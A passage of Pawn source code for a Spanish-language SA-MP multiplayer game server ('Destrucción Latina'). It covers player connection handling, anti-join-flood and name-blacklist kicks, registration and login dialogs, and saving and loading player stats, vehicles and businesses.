		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

//==============================On Player Connect===============================
public OnPlayerConnect(playerid)
{
    IsSpawned[playerid] = 0;
	new Nombre_rcon[MAX_PLAYER_NAME];
    GetPlayerName(playerid, Nombre_rcon, sizeof(Nombre_rcon));
	SoloSuenaUnaVez[playerid] = 1;//Musica Spawn
	if(GuerraTotal == 1)
	{
	TextDrawShowForPlayer(playerid, Guerratotal);
	TextDrawShowForPlayer(playerid, Guerratotal1);
	}
	TRaceJugadores2[playerid] = TextDrawCreate(205.000000, 432.000000, "99");
	TextDrawBackgroundColor(TRaceJugadores2[playerid], 255);
	TextDrawFont(TRaceJugadores2[playerid], 1);
	TextDrawLetterSize(TRaceJugadores2[playerid], 0.460000, 1.599998);
	TextDrawColor(TRaceJugadores2[playerid], -16711681);
	TextDrawSetOutline(TRaceJugadores2[playerid], 1);
	TextDrawSetProportional(TRaceJugadores2[playerid], 1);
	TextDrawSetShadow(TRaceJugadores2[playerid], 1);
	//
	TRaceTiempoRestante2[playerid] = TextDrawCreate(390.000000, 432.000000, "150");
	TextDrawBackgroundColor(TRaceTiempoRestante2[playerid], 255);
	TextDrawFont(TRaceTiempoRestante2[playerid], 1);
	TextDrawLetterSize(TRaceTiempoRestante2[playerid], 0.460000, 1.599998);
	TextDrawColor(TRaceTiempoRestante2[playerid], -16711681);
	TextDrawSetOutline(TRaceTiempoRestante2[playerid], 1);
	TextDrawSetProportional(TRaceTiempoRestante2[playerid], 1);
	TextDrawSetShadow(TRaceTiempoRestante2[playerid], 1);
	//
	TCheckpoint2[playerid] = TextDrawCreate(565.000000, 432.000000, "20/20");
	TextDrawBackgroundColor(TCheckpoint2[playerid], 255);
	TextDrawFont(TCheckpoint2[playerid], 1);
	TextDrawLetterSize(TCheckpoint2[playerid], 0.460000, 1.599998);
	TextDrawColor(TCheckpoint2[playerid], -16711681);
	TextDrawSetOutline(TCheckpoint2[playerid], 1);
	TextDrawSetProportional(TCheckpoint2[playerid], 1);
	TextDrawSetShadow(TCheckpoint2[playerid], 1);
	//
	SendDeathMessage(INVALID_PLAYER_ID, playerid, 200);
	TextDrawShowForPlayer(playerid, TBox);
	TextDrawShowForPlayer(playerid, TComandos);
	SetPlayerInterior(playerid,0);
	ApplyAnimation(playerid, "GYMNASIUM", "gym_shadowbox",  4.1,7,5,1,1,1);
	//iTranslate_OnPlayerConnect(playerid);
	//==========================SISTEMA DE DERBY============================//
	PI[playerid][P_STATUS] = STATUS_CONNECTED;
	PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
	GetPlayerName(playerid, PI[playerid][P_NAME], 24);
//-----------------------------------LUsers-------------------------------------
	for(new i = 0; i < 50; i++) SendClientMessage(playerid, red, " ");
	PlayerInfo[playerid][vhpb] = 1; //vida vehiculo
	BalasExplosivas[playerid] = 0;
	BalasSniperDM[playerid] = 0;
	PlayerInfo[playerid][DesactivarChat] = 0;
    ArmasProhibidas[playerid]=1;
    InitFly(playerid);
    StopFly(playerid);
    Glow[playerid] = 0;
    KillTimer(vremea[playerid]);
    ColorCar[playerid] = 0;
    crazycar[playerid] = 0;
    MegaJump[playerid] = 0;
	FireShotON[playerid] = false; //Auto tanque
	PlayerAutoCBUG[playerid] = 0; 
	DestroyObject(GhostRiderObjects[playerid][0]);
    DestroyObject(GhostRiderObjects[playerid][1]);
    DestroyObject(GhostRiderObjects[playerid][2]);
	GhostRiderObjects[playerid][0]=0;
    if(CreatedRamp[playerid] == true) DestroyObject(Ramp[playerid]), CreatedRamp[playerid] = false;
	CreatedRamp[playerid] = false;
	Enabled[playerid]=0;
	Pers[playerid]=0;
    AntiFlood[playerid] = false;
    afk[playerid] = 0;
    speedo[playerid] = 1; //VELOCIMETRO
    BloquearComandosInBank[playerid] = 0;
    BloquearComandosInDM[playerid] = 0;
    BloquearComandosInRace[playerid] = 0;
    BloquearComandosInDerby[playerid] = 0;
    Informacion[playerid][Bloqueado] = 1;
    PlayerInfo[playerid][Hide] = 0;
	PlayerInfo[playerid][bank] = 0;
	PlayerInfo[playerid][bowner] = 0;
	PlayerInfo[playerid][bowned] = 0;
	PlayerInfo[playerid][Deaths] = 0;
	PlayerInfo[playerid][Kills] = 0;
	PlayerInfo[playerid][Twin] = 0;
    PlayerInfo[playerid][Rwin] = 0;
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Vip] = 0;
	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Registered] = 0;
	PlayerInfo[playerid][God] = 0;
	PlayerInfo[playerid][TimesSpawned] = 0;
	PlayerInfo[playerid][Muted] = 0;
	PlayerInfo[playerid][MuteWarnings] = 0;
	PlayerInfo[playerid][Warnings] = 0;
	PlayerInfo[playerid][Caps] = 0;
	PlayerInfo[playerid][DoorsLocked] = 0;
	for(new i; i<PING_MAX_EXCEEDS; i++) PlayerInfo[playerid][pPing][i] = 0;
	PlayerInfo[playerid][SpamCount] = 0;
	PlayerInfo[playerid][SpamTime] = 0;
	PlayerInfo[playerid][PingCount] = 0;
	PlayerInfo[playerid][PingTime] = 0;
	PlayerInfo[playerid][FailLogin] = 0;
	PlayerInfo[playerid][ConnectTime] = gettime();
    //-----------------------------------------------------
	format(tstring, sizeof(tstring), " ");
	new IP[20];
	GetPlayerIp(playerid,IP,sizeof(IP));
	//-------------------------
	new Texto[128];
	new Nombre[MAX_PLAYER_NAME];
	if(IsPlayerNPC(playerid))
	return 1;
	new Entradas = 0;
	new RegistroIP[20];
	new Cuenta = GetTickCount();
	new Nick[MAX_PLAYER_NAME];
	new Codigo;
	new Jugador;
	if(DetectarIP(ObtenerIP(playerid)) >= 5) return BanearBots(playerid), 0;
	Jugadores = playerid > Jugadores ? playerid : IDMayor(),
	BotServidor[playerid] = bool:IsPlayerNPC(playerid),
	Advertencias[playerid] = 0;
	Muertes[playerid] = 0;
	MuerteReciente[playerid] = 0;
	GetPlayerIp(playerid, RegistroIP, 19);
	GetPlayerName(playerid, Nick, MAX_PLAYER_NAME);
	if(AntiJoinFlood==1)
	{
		for(Codigo = 0; Codigo < 5; Codigo++)
		{
			if(strlen(EntrarIP[Codigo]) < 5)  continue;
			if(strcmp(RegistroIP, EntrarIP[Codigo], true) == 0)
			{
				if((Cuenta - MenorTiempo) < EntrarCuenta[Codigo])
				{
					Entradas++;
				}
			}
		}
		if (Entradas >= Logueos)
		{
			GetPlayerName(playerid, Nombre, sizeof(Nombre));
			format(Texto, sizeof(Texto), "{EAEAEA}%s(%d) ha sido baneado. {FF0000}(Posible JoinFlood)", Nombre, playerid);
			SendClientMessageToAll(red, Texto);
			SaveToFile("BanLog",Texto);
			if(udb_Exists(PlayerName2(playerid)) && PlayerInfo[playerid][LoggedIn] == 1) dUserSetINT(PlayerName2(playerid)).("banned",1);
			BanEx(playerid, "Baneado por intento de Join Flood");
		}
	}
	for (Codigo = 9; Codigo > 0; Codigo--)
	{
		Jugador = Codigo - 1;
		format(EntrarIP[Codigo], 19, "%s", EntrarIP[Jugador]);
		EntrarCuenta[Codigo] = EntrarCuenta[Jugador];
	}
	format(EntrarIP[0], 19, "%s", RegistroIP);
	EntrarCuenta[0] = Cuenta;
	new PlayerName[128],string[140],file[256];
	GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
	new tmp3[50]; GetPlayerIp(playerid,tmp3,50);
	if(!strcmp(PlayerName,DEFAULT_OWNER)){
		SendClientMessage(playerid, red, "|Info| »{FFFFFF} Tu nombre esta en nuestra lista negra. Has sido kickeado.");
		format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Nombre Prohibido)",PlayerName);
		//SendClientMessageToAll(red,string);
		SaveToFile("KickLog",string);
		print(string);
	}
	if(ServerInfo[ConnectMessages] == 1)
	{
	    new country[256], city[256];
        new ticks = tickcount();
        GetPlayerCountry(playerid, country, sizeof(country));
        printf("Countrys took %d ms", tickcount()-ticks);
        ticks = tickcount();
        GetPlayerCity(playerid, city, sizeof(city));
        printf("City took %d ms", tickcount()-ticks);
  		format(string, sizeof string, "{EAEAEA}%s(%d) ha entrado al servidor. {0078FF}(%s, %s)", pName(playerid), playerid, country, city);
		print(string);
		SendClientMessageToAll(red, string);
	}
	//-----------------------------------------------------
    if (dUserINT(PlayerName2(playerid)).("banned") == 1)
    {
        SendClientMessage(playerid, red, "|Info| »{FFFFFF} Este nombre esta baneado en este servidor.");
		format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Nombre Baneado)",PlayerName,playerid);
		SendClientMessageToAll(red, string);  print(string);
		SaveToFile("KickLog",string);
        Kick(playerid);
    }
	//-----------[ Name Kick ]-----------------
	if(ServerInfo[NameKick] == 1) {
		for(new s = 0; s < BadNameCount; s++) {
  			if(!strcmp(BadNames[s],PlayerName,true)) {
         		SendClientMessage(playerid,red, "|Info| »{FFFFFF} Tu nombre esta en nuestra lista negra. Has sido kickeado.");
				format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Nombre Prohibido)",PlayerName,playerid);
				SendClientMessageToAll(red, string);  print(string);
				SaveToFile("KickLog",string);
				Kick(playerid);
				return 1;
			}
		}
	}
		//-----------------------------------------------------
	if(ServerInfo[PartNameKick] == 1) {
		for(new s = 0; s < BadPartNameCount; s++) {
			new pos;
			while((pos = strfind(PlayerName,BadPartNames[s],true)) != -1) for(new i = pos, j = pos + strlen(BadPartNames[s]); i < j; i++)
			{
			    SendClientMessage(playerid,red, "|Info| »{FFFFFF} Tu nombre esta en nuestra lista negra. Has sido kickeado.");
				format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Nombre Prohibido)",PlayerName,playerid);
				SendClientMessageToAll(red, string);  print(string);
				SaveToFile("KickLog",string);
				Kick(playerid);
				return 1;
			}
		}
	}
	//-----------------------------------------------------
	if(ServerInfo[Locked] == 1) {
		PlayerInfo[playerid][AllowedIn] = false;
		SendClientMessage(playerid,red,"|Info| »{EAEAEA} El servidor esta bloqueado. Tienes 20 segundos para ingresar la contraseña del servidor antes de ser expulsado.");
		SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Password [Contraseña]");
		LockKickTimer[playerid] = SetTimerEx("AutoKick", 20000, 0, "i", playerid);
	}
	//-----------------------------------------------------
	if(strlen(dini_Get("ladmin/config/aka.txt", tmp3)) == 0) dini_Set("ladmin/config/aka.txt", tmp3, PlayerName);
 	else
	{
	    if( strfind( dini_Get("ladmin/config/aka.txt", tmp3), PlayerName, true) == -1 )
		{
		    new akastring[256];
		    format(akastring,sizeof(akastring),"%s,%s", dini_Get("ladmin/config/aka.txt",tmp3), PlayerName);
		    dini_Set("ladmin/config/aka.txt", tmp3, akastring);
		}
	}
	if(!udb_Exists(PlayerName2(playerid)))
	{
	    format(lstring,256,"\n{FFFFFF}Bienvenido al servidor {20B3FF}Destrucción Latina.\n\n{FFFFFF}El nick {84FCF9}%s{FFFFFF} no esta registrado.\n{FFFFFF}Ingresa una contraseña para registrarte.",pName(playerid));
     	ShowPlayerDialog(playerid,REGISTRO,DIALOG_STYLE_INPUT,"{FFFFFF}Registro",lstring,"Registrar","");
		//format(lstring,256,"\n{FFFFFF}Bienvenido {00FF00}%s{FFFFFF} al servidor {C0C0C0}M A T R I X, {FFFFFF}recuerda registrarte con \n{00BFFF}/Register{FFFFFF} para poder guardar tus stats y comprar casas, negocios y vehiculos.",pName(playerid));
		//ShowPlayerDialog(playerid,543,DIALOG_STYLE_MSGBOX,"{FF0000}BIENVENIDO",lstring,"Aceptar","");
	}
	else
	{
		PlayerInfo[playerid][Registered] = 1;
		format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName));
		new tmp2[256]; tmp2 = dini_Get(file,"ip");
		if( (!strcmp(tmp3,tmp2,true)) && (ServerInfo[AutoLogin] == 1) )
		{
			LoginPlayer(playerid);
			if(PlayerInfo[playerid][Level] > 0)
			{
				format(string,sizeof(string),"|Cuenta| »{EAEAEA} Has sido automaticamente identificado. {0080FF}[Nivel %d] {00FF00}[Nivel Vip: %d]", PlayerInfo[playerid][Level],PlayerInfo[playerid][Vip]);
				SendClientMessage(playerid,red,string);
			}
			else SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Has sido automaticamente identificado.");
		}
		else
		{
 			format(lstring,256,"\n{FFFFFF}Bienvenido nuevamente a {20B3FF}Destrucción Latina.\n\n{FFFFFF}El nick {84FCF9}%s{FFFFFF} esta registrado.\n{FFFFFF}Ingresa la contraseña para acceder a tu cuenta.",pName(playerid));
			ShowPlayerDialog(playerid,INGRESO,DIALOG_STYLE_INPUT,"{FFFFFF}Ingreso",lstring,"Acceder","");
		}
	}
	//-----------------------------------------
	AceleracionBrutal[playerid] = false; // Reseteamos la variable
	SaltosVehiculo[playerid]=false; //Reseteamos la variable
	ReqBk[playerid] = 0;
	ReqBkRecent[playerid] = 0;
	ReportedRecent[playerid] = 0;
	StoleCopCarRecent[playerid] = 0;
	triedtoescaperecent[playerid] = 0;
	JailTime[playerid] = 0;
	JailTimeServed[playerid] = 0;
	copshavevc[playerid] = 0;
	commitedcrimerecently[playerid] = 0;
	OldCash[playerid] = 0;
	RobbedPlyRecent[playerid] = 0;
	beenrobbedrecently[playerid] = 0;
    fixedcarrecent[playerid] =0;
	INFO[playerid][UsaDrogas] = 0;
	LoadPlayer(playerid);
   	return 1;
}

//===========================[Auto Kick]========================================
forward AutoKick(playerid);
public AutoKick(playerid)
{
	if( IsPlayerConnected(playerid) && ServerInfo[Locked] == 1 && PlayerInfo[playerid][AllowedIn] == false) {
		new string[128];
		SendClientMessage(playerid,red,"|Info| »{FFFFFF} Has sido automaticamente kickeado. Razón: Servidor Bloqueado.");
		format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Servidor Bloqueado)",PlayerName2(playerid),playerid);
		SaveToFile("KickLog",string);
		SendClientMessageToAll(red, string); print(string);
		Kick(playerid);
	}
	return 1;
}

public Detect(playerid)
{
	new Ping = GetPlayerPing(playerid);
	if(Ping <= 0 || Ping >= 100000)
	{
		if(Advertencias[playerid] >= 1) BanearBots(playerid);
		else Advertencias[playerid]++, Barra[playerid] = SetTimerEx("Detectar", 1500, false, "Ping", playerid);
	}
	return 0;
}
//===========================Player and Vehicle Stuff===========================
LoadPlayer(playerid)
{
	new playername[MAX_PLAYER_NAME],file[256];
	GetPlayerName(playerid, playername, sizeof(playername));
	format(file,256,"/ladmin/users/%s.sav",udb_encode(playername));
 	if(udb_Exists(PlayerName2(playerid))) {
		PlayerInfo[playerid][name] = playername;
		SetPlayerScore(playerid, dUserINT(PlayerName2(playerid)).("score"));
		PlayerInfo[playerid][pcash] = (dUserINT(PlayerName2(playerid)).("Money"));
		PlayerInfo[playerid][bank] = (dUserINT(PlayerName2(playerid)).("Bank"));
		PlayerInfo[playerid][bowner] = (dUserINT(PlayerName2(playerid)).("bowner"));
		PlayerInfo[playerid][bowned] = (dUserINT(PlayerName2(playerid)).("bowned"));
		PlayerInfo[playerid][vowned] = (dUserINT(PlayerName2(playerid)).("vowned"));
		PlayerInfo[playerid][vowner] = (dUserINT(PlayerName2(playerid)).("vowner"));
		PlayerInfo[playerid][vowned2] = (dUserINT(PlayerName2(playerid)).("vowned2"));
		PlayerInfo[playerid][vowner2] = (dUserINT(PlayerName2(playerid)).("vowner2"));
		PlayerInfo[playerid][vowned3] = (dUserINT(PlayerName2(playerid)).("vowned3"));
		PlayerInfo[playerid][vowner3] = (dUserINT(PlayerName2(playerid)).("vowner3"));
		PlayerInfo[playerid][vowned4] = (dUserINT(PlayerName2(playerid)).("vowned4"));
		PlayerInfo[playerid][vowner4] = (dUserINT(PlayerName2(playerid)).("vowner4"));
		PlayerInfo[playerid][vowned5] = (dUserINT(PlayerName2(playerid)).("vowned5"));
		PlayerInfo[playerid][vowner5] = (dUserINT(PlayerName2(playerid)).("vowner5"));
		PlayerInfo[playerid][vowned6] = (dUserINT(PlayerName2(playerid)).("vowned6"));
		PlayerInfo[playerid][vowner6] = (dUserINT(PlayerName2(playerid)).("vowner6"));
		PlayerInfo[playerid][vowned7] = (dUserINT(PlayerName2(playerid)).("vowned7"));
		PlayerInfo[playerid][vowner7] = (dUserINT(PlayerName2(playerid)).("vowner7"));
		PlayerInfo[playerid][vowned8] = (dUserINT(PlayerName2(playerid)).("vowned8"));
		PlayerInfo[playerid][vowner8] = (dUserINT(PlayerName2(playerid)).("vowner8"));
		PlayerInfo[playerid][vowned9] = (dUserINT(PlayerName2(playerid)).("vowned9"));
		PlayerInfo[playerid][vowner9] = (dUserINT(PlayerName2(playerid)).("vowner9"));
		PlayerInfo[playerid][vowned10] = (dUserINT(PlayerName2(playerid)).("vowned10"));
		PlayerInfo[playerid][vowner10] = (dUserINT(PlayerName2(playerid)).("vowner10"));
	}
}

SavePlayer(playerid)
{
	new PlayerName[24];
	GetPlayerName(playerid,PlayerName,24);
	new file[256]; format(file,256,"/ladmin/users/%s.sav",udb_encode(PlayerName));
	if(PlayerInfo[playerid][LoggedIn] == 1){
	    dUserSetINT(PlayerName2(playerid)).("score",GetPlayerScore(playerid));
	   	dUserSetINT(PlayerName2(playerid)).("money",GetPlayerMoney(playerid));
	   	dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
	   	dUserSetINT(PlayerName2(playerid)).("twin",PlayerInfo[playerid][Twin]);
	   	dUserSetINT(PlayerName2(playerid)).("rwin",PlayerInfo[playerid][Rwin]);

		new h, m, s;
	    TotalGameTime(playerid, h, m, s);

		dUserSetINT(PlayerName2(playerid)).("hours", h);
		dUserSetINT(PlayerName2(playerid)).("minutes", m);
		dUserSetINT(PlayerName2(playerid)).("seconds", s);

	   	new Float:x,Float:y,Float:z, interior;
	   	GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
	    dUserSetINT(PlayerName2(playerid)).("x1",floatround(x));
		dUserSetINT(PlayerName2(playerid)).("y1",floatround(y));
		dUserSetINT(PlayerName2(playerid)).("z1",floatround(z));
	    dUserSetINT(PlayerName2(playerid)).("interior1",interior);

		new arma0, balas0, arma1, balas1, arma2, balas2, arma3, balas3, arma4, balas4, arma5, balas5, arma6, balas6, /*arma7, balas7,*/ arma8, balas8, arma9, balas9, arma10, balas10, arma12, balas12;
		GetPlayerWeaponData(playerid,0,arma0,balas0);
		GetPlayerWeaponData(playerid,1,arma1,balas1);
		GetPlayerWeaponData(playerid,2,arma2,balas2);// hand gun
		GetPlayerWeaponData(playerid,3,arma3,balas3);//shotgun
		GetPlayerWeaponData(playerid,4,arma4,balas4);// SMG
		GetPlayerWeaponData(playerid,5,arma5,balas5);// AK47 / M4
		GetPlayerWeaponData(playerid,6,arma6,balas6);// rifle
		//GetPlayerWeaponData(playerid,7,arma7,balas7);// rocket launcher
		GetPlayerWeaponData(playerid,8,arma8,balas8);
		GetPlayerWeaponData(playerid,9,arma9,balas9);
		GetPlayerWeaponData(playerid,10,arma10,balas10);
		GetPlayerWeaponData(playerid,12,arma12,balas12);
		dUserSetINT(PlayerName2(playerid)).("arma0",arma0); dUserSetINT(PlayerName2(playerid)).("arma0balas",balas0);
		dUserSetINT(PlayerName2(playerid)).("arma1",arma1); dUserSetINT(PlayerName2(playerid)).("arma1balas",balas1);
	   	dUserSetINT(PlayerName2(playerid)).("arma2",arma2); dUserSetINT(PlayerName2(playerid)).("arma2balas",balas2);
	  	dUserSetINT(PlayerName2(playerid)).("arma3",arma3);	dUserSetINT(PlayerName2(playerid)).("arma3balas",balas3);
	  	dUserSetINT(PlayerName2(playerid)).("arma4",arma4);	dUserSetINT(PlayerName2(playerid)).("arma4balas",balas4);
		dUserSetINT(PlayerName2(playerid)).("arma5",arma5); dUserSetINT(PlayerName2(playerid)).("arma5balas",balas5);
	  	dUserSetINT(PlayerName2(playerid)).("arma6",arma6);	dUserSetINT(PlayerName2(playerid)).("arma6balas",balas6);
		//dUserSetINT(PlayerName2(playerid)).("arma7",arma7); dUserSetINT(PlayerName2(playerid)).("arma7balas",balas7);
		dUserSetINT(PlayerName2(playerid)).("arma8",arma8); dUserSetINT(PlayerName2(playerid)).("arma8balas",balas8);
		dUserSetINT(PlayerName2(playerid)).("arma9",arma9); dUserSetINT(PlayerName2(playerid)).("arma9balas",balas9);
		dUserSetINT(PlayerName2(playerid)).("arma10",arma10); dUserSetINT(PlayerName2(playerid)).("arma10balas",balas10);
		dUserSetINT(PlayerName2(playerid)).("arma12",arma12); dUserSetINT(PlayerName2(playerid)).("arma12balas",balas12);


		new	Float:health;	GetPlayerHealth(playerid, Float:health);
		new	Float:armour;	GetPlayerArmour(playerid, Float:armour);
		new year,month,day;	getdate(year, month, day);
		new strdate[20];	format(strdate, sizeof(strdate), "%d.%d.%d",day,month,year);

		dUserSetINT(PlayerName2(playerid)).("health",floatround(health));
	    dUserSetINT(PlayerName2(playerid)).("armour",floatround(armour));
		dini_Set(file,"LastOn",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",0);
		dUserSetINT(PlayerName2(playerid)).("TimesOnServer",(dUserINT(PlayerName2(playerid)).("TimesOnServer"))+1);

		dUserSetINT(PlayerName2(playerid)).("Bank",PlayerInfo[playerid][bank]);
		dUserSetINT(PlayerName2(playerid)).("bowner",PlayerInfo[playerid][bowner]);
		dUserSetINT(PlayerName2(playerid)).("bowned",PlayerInfo[playerid][bowned]);
		dUserSetINT(PlayerName2(playerid)).("vowned",PlayerInfo[playerid][vowned]);
		dUserSetINT(PlayerName2(playerid)).("vowner",PlayerInfo[playerid][vowner]);
		dUserSetINT(PlayerName2(playerid)).("vowned2",PlayerInfo[playerid][vowned2]);
		dUserSetINT(PlayerName2(playerid)).("vowner2",PlayerInfo[playerid][vowner2]);
		dUserSetINT(PlayerName2(playerid)).("vowned3",PlayerInfo[playerid][vowned3]);
		dUserSetINT(PlayerName2(playerid)).("vowner3",PlayerInfo[playerid][vowner3]);
		dUserSetINT(PlayerName2(playerid)).("vowned4",PlayerInfo[playerid][vowned4]);
		dUserSetINT(PlayerName2(playerid)).("vowner4",PlayerInfo[playerid][vowner4]);
		dUserSetINT(PlayerName2(playerid)).("vowned5",PlayerInfo[playerid][vowned5]);
		dUserSetINT(PlayerName2(playerid)).("vowner5",PlayerInfo[playerid][vowner5]);
		dUserSetINT(PlayerName2(playerid)).("vowned6",PlayerInfo[playerid][vowned6]);
		dUserSetINT(PlayerName2(playerid)).("vowner6",PlayerInfo[playerid][vowner6]);
		dUserSetINT(PlayerName2(playerid)).("vowned7",PlayerInfo[playerid][vowned7]);
		dUserSetINT(PlayerName2(playerid)).("vowner7",PlayerInfo[playerid][vowner7]);
		dUserSetINT(PlayerName2(playerid)).("vowned8",PlayerInfo[playerid][vowned8]);
		dUserSetINT(PlayerName2(playerid)).("vowner8",PlayerInfo[playerid][vowner8]);
		dUserSetINT(PlayerName2(playerid)).("vowned9",PlayerInfo[playerid][vowned9]);
		dUserSetINT(PlayerName2(playerid)).("vowner9",PlayerInfo[playerid][vowner9]);
		dUserSetINT(PlayerName2(playerid)).("vowned10",PlayerInfo[playerid][vowned10]);
		dUserSetINT(PlayerName2(playerid)).("vowner10",PlayerInfo[playerid][vowner10]);
	}
}

stock ResetOfflinePlayerFileV(fname[],vehicleid)
{
    if(dini_Int(fname,"vowned") == vehicleid) {
		dini_IntSet(fname, "vowned",0);
		dini_IntSet(fname, "vowner",0);
	}
    if(dini_Int(fname,"vowned2") == vehicleid) {
		dini_IntSet(fname, "vowned2",0);
		dini_IntSet(fname, "vowner2",0);
	}
    if(dini_Int(fname,"vowned3") == vehicleid) {
		dini_IntSet(fname, "vowned3",0);
		dini_IntSet(fname, "vowner3",0);
	}
    if(dini_Int(fname,"vowned4") == vehicleid) {
		dini_IntSet(fname, "vowned4",0);
		dini_IntSet(fname, "vowner4",0);
	}
    if(dini_Int(fname,"vowned5") == vehicleid) {
		dini_IntSet(fname, "vowned5",0);
		dini_IntSet(fname, "vowner5",0);
	}
    if(dini_Int(fname,"vowned6") == vehicleid) {
		dini_IntSet(fname, "vowned6",0);
		dini_IntSet(fname, "vowner6",0);
	}
    if(dini_Int(fname,"vowned7") == vehicleid) {
		dini_IntSet(fname, "vowned7",0);
		dini_IntSet(fname, "vowner7",0);
	}
    if(dini_Int(fname,"vowned8") == vehicleid) {
		dini_IntSet(fname, "vowned8",0);
		dini_IntSet(fname, "vowner8",0);
	}
    if(dini_Int(fname,"vowned9") == vehicleid) {
		dini_IntSet(fname, "vowned9",0);
		dini_IntSet(fname, "vowner9",0);
	}
    if(dini_Int(fname,"vowned10") == vehicleid) {
		dini_IntSet(fname, "vowned10",0);
		dini_IntSet(fname, "vowner10",0);
	}
	SetVehicleToRespawn(vehicleid);
	SetVehicleVirtualWorld(vehicleid,10);
	SetTimerEx("EraseVehicle",10000,0,"i",vehicleid);
	VehicleInfo[vehicleid][bought] = 0;
	VehicleInfo[vehicleid][secure] = 0;
	VehicleInfo[vehicleid][asecure] = 0;
	strmid(VehicleInfo[vehicleid][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
	#if defined TEMP_PARK
	VehicleInfo[vehicleid][x_spawn] = VehicleInfo[vehicleid][ox_spawn];
	VehicleInfo[vehicleid][y_spawn] = VehicleInfo[vehicleid][oy_spawn];
	VehicleInfo[vehicleid][z_spawn] = VehicleInfo[vehicleid][oz_spawn];
	VehicleInfo[vehicleid][za_spawn] = VehicleInfo[vehicleid][oza_spawn];
	#endif
}

stock ResetOfflinePlayerFileB(fname[],bizid)
{
	new cbmon = BizInfo[bizid][cashbox];
	new bcmon = BizInfo[bizid][cost];
	new bmon = dini_Int(fname,"bank");
	dini_IntSet(fname, "bank",cbmon+bmon+bcmon);
	dini_IntSet(fname, "bowner",0);
	dini_IntSet(fname, "bowned",0);
	strmid(BizInfo[bizid][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
	BizInfo[bizid][bought] = 0;
	BizInfo[bizid][cashbox] = 0;
	DestroyDynamicMapIcon(bizid);
	new bizowner[30];
	format(bizowner,128,"%s",BizInfo[bizid][owner]);
	if(strcmp(BizInfo[bizid][owner],DEFAULT_OWNER,false) == 0) {
		format(bizowner,128,"En Venta");
	}
	UpdateDynamic3DTextLabelText(bizTextInfo[bizid],0xFF0000FF,bizowner);
	BizInfo[bizid][ico] = CreateDynamicMapIcon(BizInfo[bizid][xpos],BizInfo[bizid][ypos],BizInfo[bizid][zpos],52,250);
}

public OnVehicleDeath(vehicleid, killerid, playerid)
{
	new veh = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(veh) == 463){
		if(GhostRiderObjects[playerid][0]){GhostRiderDesactivar(playerid);return 1;}
	}
	//===========================SISTEMA DE DERBY=================================
	if(!IsPlayerConnected(killerid)) return 1;
	if(PI[killerid][P_GAMEMODE] == GAME_DERBY)
	{
		if(vehicleid != PI[killerid][P_DERBY_VEHICLEID]) return 1;
		if(PI[killerid][P_STATUS] == STATUS_SPAWNED && PI[killerid][P_DERBY_STATUS] == PD_NORMAL)
		{
			if(DI[STATUS] == DERBY_RUNNING && DI[ACTIVE_PLAYERS] > 1) PlayerDerbyDead(killerid);
		}
		return 1;
	}
	////////////////////////////////////////////////////////////////////////////
	if(VehicleInfo[vehicleid][Temp] == 1) SetTimerEx("EraseVehicle", 5000,0,"i",vehicleid);
	if(VehicleInfo[vehicleid][ConObjetos] == 1) SetTimerEx("EraseVehicleConObjetos", 5000,0,"i",vehicleid);
	if(onsys[vehicleid] == 1) SetTimerEx("EraseVehicle",10000,0,"i",vehicleid);
    SandInEngine[vehicleid] =0;
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
//------------------------------------------------------------------------------
	passenger[playerid] = ispassenger;
	if (GetPlayerSurfingVehicleID(playerid) == vehicleid)
	{
		ClearAnimations(playerid);
	}
	#if defined ENABLE_SPEC
	for(new xp=0; xp<MAX_PLAYERS; xp++) {
	    if(GetPlayerState(xp) == PLAYER_STATE_SPECTATING && PlayerInfo[xp][SpecID] == playerid) {
	        TogglePlayerSpectating(xp, 1);
	        PlayerSpectateVehicle(xp, vehicleid);
	        PlayerInfo[xp][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
		}
	}
	#endif
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    SendClientMessage(playerid,red, "|Info| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	    return 1;
	}
	if(onsys[vehicleid] == 1) {
		if(passenger[playerid] == 0) {
			if(PlayerInfo[playerid][LoggedIn] == 1) {
				if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) return 1;
				if (strcmp(VehicleInfo[vehicleid][owner],PlayerInfo[playerid][name],false) == 0) {
					new string[128];
					format(string, sizeof(string), "|Info| »{EAEAEA} Bienvenido a tu {5783C2}%s. {EAEAEA}Conduzca con cuidado!", VehicleInfo[vehicleid][name]);
					//GameTextForPlayer(playerid, string, 3000, 4);
   					SendClientMessage(playerid, red, string);
					return 1;
				}
				if (strcmp(VehicleInfo[vehicleid][owner],DEFAULT_OWNER,false) == 0) {
					if(VehicleInfo[vehicleid][buybar] == 1) {
						new string[128];
						format(string,sizeof(string),"|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} no esta en venta.", VehicleInfo[vehicleid][name]);
    					SendClientMessage(playerid, red, string);
						return 1;
